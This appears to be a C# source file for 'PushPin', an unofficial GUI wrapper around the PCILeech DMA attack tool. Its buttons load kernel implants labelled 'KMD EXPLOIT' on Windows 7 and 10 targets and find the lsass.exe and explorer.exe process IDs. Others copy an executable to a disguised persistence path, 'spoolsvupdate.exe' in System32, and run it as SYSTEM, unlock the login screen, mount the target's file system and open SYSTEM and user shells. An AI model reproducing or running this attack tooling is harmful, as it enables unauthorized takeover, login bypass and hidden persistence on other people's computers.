/*******************************************************************************************************************************/
// Project: PushPin 
// Filename: Form.cs 
// Description: PushPin is designed to provide a visual interface wrapper to pcileech
// PushPin author: JT, jtestman@gmail.com
// PCILeech author: Ulf Frisk, pcileech@frizk.net
// Dependencies: PCILeech v4.7 - https://github.com/ufrisk and it's dependencies 
/*******************************************************************************************************************************/

namespace PushPin
{
    using System;
    using System.Data;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            // Set the default persistence destination path   
            Class_destination_path.Destination = @"c:\windows\system32\spoolsvupdate.exe";
        }

        //
        // ***  WIN 7x64 KMD EXPLOIT  *** //
        //
        private void Button_win7x64_Click(object sender, EventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = "pcileech.exe ";
                start.UseShellExecute = false;
                start.CreateNoWindow = true;
                start.RedirectStandardOutput = true;
                start.Arguments = "kmdload -kmd win7x64";

                //
                // Start the process.
                //
                using (Process process = Process.Start(start))
                {
                    //
                    // Read in text from the process with StreamReader.
                    //
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();

                        textBox_status.Text = result;

                        Class_action.Action = "Win7x64 KMD";
                        Class_status.Status = result;
                    }
                }

                Find_address();
            }
            catch (Exception)
            {
                //textBox_status.AppendText(Environment.NewLine + ex.ToString());
            }
        }

        //
        // ***  WIN 10x64 KMD EXPLOIT  *** //
        //
        private void Button_win10x64_Click(object sender, EventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = "pcileech.exe";
                start.UseShellExecute = false;
                start.CreateNoWindow = true;
                start.RedirectStandardOutput = true;
                start.Arguments = "kmdload -kmd WIN10_X64";

                //
                // Start the process.
                //
                using (Process process = Process.Start(start))
                {
                    //
                    // Read in text from the process with StreamReader.
                    //
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();

                        textBox_status.Text = result;

                        Class_action.Action = "Win10x64 KMD";
                        Class_status.Status = result;
                    }
                }

                Find_address();
            }
            catch (Exception)
            {
                //textBox_status.AppendText(Environment.NewLine + ex.ToString());
            }
        }

        //
        // ***  WIN 10x64_3 memmap method KMD EXPLOIT *** //
        // WIN10_X64_3 is currently stable accross versions of Windows 10 including Windows 10 2004 release
        //
        private void Button_win10x64_3_Click(object sender, EventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = "pcileech.exe";
                start.UseShellExecute = false;
                start.CreateNoWindow = true;
                start.RedirectStandardOutput = true;
                start.Arguments = "kmdload -kmd WIN10_X64_3 -memmap auto ";

                //
                // Start the process.
                //
                using (Process process = Process.Start(start))
                {
                    //
                    // Read in text from the process with StreamReader.
                    //
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();

                        textBox_status.Text = result;

                        Class_action.Action = "Win10x64_3 KMD";
                        Class_status.Status = result;
                    }
                }

                Find_address();
            }
            catch (Exception)
            {
                //textBox_status.AppendText(Environment.NewLine + ex.ToString());
            }
        }

        //
        // ***  KMD/PROCESS PARSE COMMON  *** //
        //
        public void Find_address()
        {
            try
            {
                // PARSE KMD ADDRESS 
                string kdmfind = Class_status.Status;

                var regex = new Regex("KMD: Successfully loaded at address:*(.*)");

                var regex_kmdaddress = regex.Matches(kdmfind)
                               .Cast<Match>()
                               .Select(match => match.Groups[1].ToString())
                               .First();

                // Set global for KMD Address
                Class_kmdaddress.Kmdaddress = regex_kmdaddress;

                textBox_kmd.Text = ("Loaded = " + Class_kmdaddress.Kmdaddress + "\r\n");
            }
            catch (Exception)
            {
                //textBox_status.AppendText(Environment.NewLine + ex.ToString());
            }

            // EXECUTE x64 PSLIST
            Process psi_win_pslist = new Process();
            psi_win_pslist.StartInfo.FileName = "pcileech.exe";
            psi_win_pslist.StartInfo.Arguments = "wx64_pslist -kmd" + Class_kmdaddress.Kmdaddress;
            psi_win_pslist.StartInfo.UseShellExecute = false;
            psi_win_pslist.StartInfo.CreateNoWindow = true;
            psi_win_pslist.StartInfo.RedirectStandardOutput = true;
            psi_win_pslist.StartInfo.RedirectStandardError = true;
            psi_win_pslist.Start();

            StreamReader psi_win_pslist_output = psi_win_pslist.StandardOutput;
            string processlist = psi_win_pslist_output.ReadToEnd();

            psi_win_pslist.WaitForExit();
            psi_win_pslist.Close();

            // Set global for PSLIST output
            Class_process_output.Process = processlist;

            // Parse USR PID for address - Someone is on the system if explorer.exe exist 
            try
            {
                string pidfind = Class_process_output.Process;
                var regex = new Regex("explorer" + "\\.exe\\s*.*PID=(.*)\\|");
                var regex_userpid = "0x" + regex.Matches(pidfind)
                               .Cast<Match>()
                               .Select(match => match.Groups[1].ToString())
                               .First();

                // Set global for USER PID
                Class_userpid.Userpid = regex_userpid;

                textBox_usrpid.Text = ("explorer.exe = " + Class_userpid.Userpid);
            }
            catch (Exception)
            {
                textBox_usrpid.AppendText(Environment.NewLine + "Unable to locate a user PID..");
            }

            // Parse SYSTEM PID for address - lsass.exe process runs as system  
            try
            {
                string pidfind = Class_process_output.Process;

                var regex = new Regex("lsass" + "\\.exe\\s*.*PID=(.*)\\|");
                var regex_syspid = "0x" + regex.Matches(pidfind)
                               .Cast<Match>()
                               .Select(match => match.Groups[1].ToString())
                               .First();

                // Set global for SYSTEM PID
                Class_syspid.Syspid = regex_syspid;

                textBox_syspid.Text = ("lsass.exe = " + Class_syspid.Syspid);
            }
            catch (Exception)
            {
                textBox_syspid.Text = ("Error - check status");
            }

            WriteToLog();
        }

        //
        // *** Reset everything *** //
        //
        public void Reset_all()
        {
            // clear text box text 
            textBox_kmd.Clear();
            textBox_status.Clear();
            textBox_syspid.Clear();
            textBox_usrpid.Clear();
            textBox_filebrowse.Clear();
            textBox_destination.Clear();
            // clear get:sets
            Class_status.Status = null;
            Class_syspid.Syspid = null;
            Class_userpid.Userpid = null;
            Class_pidfind.Pidfind = null;
            Class_kmdaddress.Kmdaddress = null;
            Class_process_output.Process = null;
            Class_source_path.Source = null;
            Class_destination_path.Destination = null;
            // set default destination path/exe
            Class_destination_path.Destination = @"c:\windows\system32\spoolsvupdate.exe";
        }

        //
        // *** Kill shells/pcileech process *** //
        //
        private void Button_killcmd_Click(object sender, EventArgs e)
        {
            ProcessStartInfo ps_cmd_kill = new ProcessStartInfo("cmd");
            ps_cmd_kill.UseShellExecute = false;
            ps_cmd_kill.RedirectStandardOutput = true;
            ps_cmd_kill.CreateNoWindow = true;
            ps_cmd_kill.RedirectStandardInput = true;
            var proc = Process.Start(ps_cmd_kill);
            proc.StandardInput.WriteLine("TASKKILL /F /IM cmd.exe /T");
            proc.StandardInput.WriteLine("exit");

            ProcessStartInfo leeach_cmd_kill = new ProcessStartInfo("cmd");
            leeach_cmd_kill.UseShellExecute = false;
            leeach_cmd_kill.RedirectStandardOutput = true;
            leeach_cmd_kill.CreateNoWindow = true;
            leeach_cmd_kill.RedirectStandardInput = true;
            var proc1 = Process.Start(leeach_cmd_kill);
            proc1.StandardInput.WriteLine("TASKKILL /F /IM pcileech.exe /T");
            proc1.StandardInput.WriteLine("exit");
        }

        //
        // *** Browse for Source file *** //
        //
        private void Button_browse_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Executable Files|*.exe;*.bat;*.ps";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string path = ofd.FileName.ToString();
                textBox_filebrowse.Text = path;

                Class_source_path.Source = path;
            }
        }

        //
        // *** Browse for Source file *** //
        //
        private void Button_execute_Click(object sender, EventArgs e)
        {
            //if (string.IsNullOrEmpty(Class_kmdaddress.Kmdaddress))
            //{
            //    textBox_status.Text = ("Load a KMD first = Win7x64 or Win10x64");
            //    return;
            //}

            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = "pcileech.exe";
                start.UseShellExecute = false;
                start.CreateNoWindow = true;
                start.RedirectStandardOutput = true;
                start.Arguments = "wx64_filepush -kmd " + Class_kmdaddress.Kmdaddress + " -in " + Class_source_path.Source + " -s " + "\\??\\" + Class_destination_path.Destination;

                //
                // Start the process.
                //
                using (Process process = Process.Start(start))
                {
                    //
                    // Read in all the text from the process with the StreamReader.
                    //
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();

                        //textBox_status.Text = result;
                        textBox_status.AppendText(Environment.NewLine + result);

                        Class_action.Action = "PUSH FILE";
                        Class_status.Status = result;
                    }
                }
            }
            catch (Exception)
            {
                // textBox_status.AppendText(Environment.NewLine + "check PCILeech path");
            }

            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = "pcileech.exe";
                start.UseShellExecute = false;
                start.CreateNoWindow = true;
                start.RedirectStandardOutput = true;
                start.Arguments = "wx64_pscreate -kmd " + Class_kmdaddress.Kmdaddress + " -s " + Class_destination_path.Destination + " -0 " + Class_syspid.Syspid + " -4 1";

                //
                // Start the process.
                //
                using (Process process = Process.Start(start))
                {
                    //
                    // Read in all the text from the process with the StreamReader.
                    //
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();

                        //textBox_status.Text = result;
                        textBox_status.AppendText(Environment.NewLine + result);

                        Class_action.Action = "EXECUTE FILE";
                        Class_status1.Status = result;
                    }
                }
            }
            catch (Exception)
            {
                // textBox_status.AppendText(Environment.NewLine + "check PCILeech path");
            }

            WriteToLog();
        }

        //
        // *** Unlock x64 *** //
        //
        private void Button_unlock_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(Class_kmdaddress.Kmdaddress))
            {
                textBox_status.Text = ("Load a KMD first = Win7x64 or Win10x64");
                return;
            }

            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = "pcileech.exe";
                start.UseShellExecute = false;
                start.CreateNoWindow = true;
                start.RedirectStandardOutput = true;
                start.Arguments = "wx64_unlock -kmd " + Class_kmdaddress.Kmdaddress + " -0 1";

                //
                // Start the process.
                //
                using (Process process = Process.Start(start))
                {
                    //
                    // Read in all the text from the process with the StreamReader.
                    //
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();

                        //textBox_status.Text = result;
                        textBox_status.AppendText(Environment.NewLine + result);

                        Class_action.Action = "UNLOCK";
                        Class_status.Status = result;
                    }
                }
            }
            catch (Exception)
            {
                // textBox_status.AppendText(Environment.NewLine + ex.ToString());
                // textBox_status.AppendText(Environment.NewLine + "check PCILeech path");
            }

            WriteToLog();
        }

        //
        // *** MNT file system *** //
        // 
        // This needs to be looked at again, Directory.Exist against Doken file system mounts are unreliable 
        private void Button_mntfs_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(Class_kmdaddress.Kmdaddress))
            {
                textBox_status.Text = ("Load a KMD first = Win7x64 or Win10x64");
                return;
            }

            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = "pcileech.exe";
                start.UseShellExecute = false;
                start.CreateNoWindow = true;
                start.RedirectStandardOutput = true;
                start.Arguments = "mount -kmd " + Class_kmdaddress.Kmdaddress;
                Process.Start(start);

                Class_action.Action = "MOUNT FS";
                Class_status.Status = "Attempted to Mount the targets file system";
                textBox_status.AppendText(Environment.NewLine + @"Check for K:\ mount");
            }
            catch (Exception)
            {
                // load kmd first
                // textBox_status.AppendText(Environment.NewLine + ex.ToString());
                // textBox_status.AppendText(Environment.NewLine + "check PCILeech path");
            }

            WriteToLog();
        }

        //
        // *** SYS Shell *** //
        //
        private void Button_sysshell_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(Class_kmdaddress.Kmdaddress))
            {
                textBox_status.Text = ("Load a KMD first = Win7x64 or Win10x64");
                return;
            }

            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd";
                process.StartInfo.Arguments = "/c pcileech.exe wx64_pscmd -kmd " + Class_kmdaddress.Kmdaddress;
                process.Start();
            }
            catch (Exception ex)
            {
                textBox_status.AppendText(Environment.NewLine + ex.ToString());
                textBox_status.AppendText(Environment.NewLine + "check PCILeech path");
            }

            Class_action.Action = "SYSTEM SHELL";
            WriteToLog();
        }

        //
        // *** USR Shell *** //
        //
        private void Button_usrshell_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(Class_kmdaddress.Kmdaddress))
            {
                textBox_status.Text = ("Load a KMD first = Win7x64 or Win10x64");
                return;
            }

            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd";
                process.StartInfo.Arguments = "/c pcileech.exe wx64_pscmd_user -kmd " + Class_kmdaddress.Kmdaddress;
                process.Start();
            }
            catch (Exception ex)
            {
                textBox_status.AppendText(Environment.NewLine + ex.ToString());
                textBox_status.AppendText(Environment.NewLine + "check PCILeech path");
            }

            Class_action.Action = "USER SHELL";
            WriteToLog();
        }

        //
        // *** Destination *** //
        //
        private void textBox_destination_TextChanged(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textBox_destination.Text))
            {
                textBox_status.Text = @"setting destination path to c:\Windows\System32\spoolsvupdate.exe";
            }
            else
            {
                string destination = textBox_destination.Text;
                Class_destination_path.Destination = destination;
            }
        }

        //
        // *** Reset button - get/set - very ugly *** //
        //
        private void Button_reset_Click(object sender, EventArgs e)
        {
            Reset_all();
        }

        // 
        // *** Logging *** //
        //
        private void WriteToLog()
        {
            FileStream fs = new FileStream("PushPinLog.txt", FileMode.Append, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);


            string title = @" 
 ___         _    ___ _      
| _ \_  _ __| |_ | _ (_)_ _  
|  _/ || (_-< ' \|  _/ | ' \ 
|_|  \_,_/__/_||_|_| |_|_||_|                                        
a-non-official gui for pcileech - https://github.com/ufrisk/pcileech 
===========================================================================
";
            sw.Write(title);
            sw.Write("Date/Time: " + DateTime.Now.ToString() + "\r\n");
            sw.Write("Action: " + Class_action.Action + "\r\n");
            sw.Write("KMD address: " + Class_kmdaddress.Kmdaddress + "\r\n");
            sw.Write("SYS PID lsass.exe: " + Class_syspid.Syspid + "\r\n");
            sw.Write("USR PID explorer.exe: " + Class_userpid.Userpid + "\r\n");
            sw.Write("Message: " + Class_status.Status + "\r\n" + Class_status1.Status + "\r\n");
            sw.Write("Source file: " + Class_source_path.Source + "\r\n");
            sw.Write("Destination file: " + Class_destination_path.Destination + "\r\n");
            sw.Write("Process output: " + Class_process_output.Process + "\r\n");
            sw.Write("=================================== END ===================================" + "\r\n" + "\r\n" + "\r\n");
            sw.Close();
            fs.Close();
        }
    }
}